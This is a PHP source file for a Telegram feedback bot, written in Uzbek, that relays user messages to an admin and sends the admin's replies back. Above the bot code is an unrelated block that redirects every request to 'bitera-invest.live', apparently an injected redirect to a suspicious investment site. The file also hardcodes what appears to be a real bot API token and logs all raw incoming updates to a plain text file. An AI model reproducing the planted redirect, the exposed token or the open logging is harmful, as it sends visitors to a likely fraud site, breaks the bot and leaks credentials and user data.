<?php
header("Location: https://bitera-invest.live/YTQdPb"); 
?>

<?php
date_default_timezone_set('Asia/Tashkent');

define('API_KEY', '5132150107:AAHDuifE1MNgWk-c197Xg7OvtaJ1hDYEW6Y');

$admin = "1130942146";

function bot($method, $datas = []){
    $url = "https://api.telegram.org/bot".API_KEY."/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    curl_close($ch);
    if (!curl_error($ch)) return json_decode($res);
};
function html($text){
    return str_replace(['<','>'],['&#60;','&#62;'],$text);
};

$update = json_decode(file_get_contents('php://input'));
// testlog
file_put_contents("info.txt",file_get_contents('php://input'));
// message variables
$message = $update->message;
$text = html($message->text);
$chat_id = $message->chat->id;
$from_id = $message->from->id;
$message_id = $message->message_id;
$first_name = $message->from->first_name;
$last_name = $message->from->last_name;
$full_name = html($first_name . " " . $last_name);
$user = $message->from->username;
// replymessage
$reply_to_message = $message->reply_to_message;
$reply_chat_id = $reply_to_message->forward_from->id;
$reply_text = $message->text;

if ($chat_id != $admin) {
    if ($text == "/start") {
        $reply = "Assalom Alaykum <b>" . $full_name . "</b>" . "<i>CarlWeb</i> kanalining rasmiy murojat botiga xush kelibsiz!\nMurojat Yo'llashingiz Mumkin 👇";
        bot('sendMessage', [ 
            'chat_id' => $chat_id,
            'text' => $reply, 
            'parse_mode' => "html",
        ]);

        $reply = "Yangi mijoz:\n" . $full_name . "\n👉 👉 <a href='tg://user?id=" . $from_id . "'>" . $from_id . "</a>\n" . date('Y-m-d H:i:s') . "";
        bot('sendMessage', [
            'chat_id' => $admin,
            'text' => $reply, 
            'parse_mode' => "html", 
        ]);

        bot('forwardMessage', [ 
            'chat_id' => $admin, 
            'from_chat_id' => $chat_id, 
            'message_id' => $message_id, 
        ]);
        
    }else if ($text != "/start"){
        bot('forwardMessage', [ 
            'chat_id' => $admin, 
            'from_chat_id' => $chat_id,
            'message_id' => $message_id, 
        ]);
    }

}else if($chat_id == $admin){
    
    if(isset($reply_to_message)){
    
        bot('sendMessage', [ 
            'chat_id' => $reply_chat_id, 
            'text' => $reply_text, 
            'parse_mode' => "html",
        ]);
    }

    if($text == "..." or $text == "/start"){
        bot('sendMessage', [
            'chat_id' => $admin,
            'text' => "Salom admin, bot ish faoliyatida!",
        ]);
    }
}
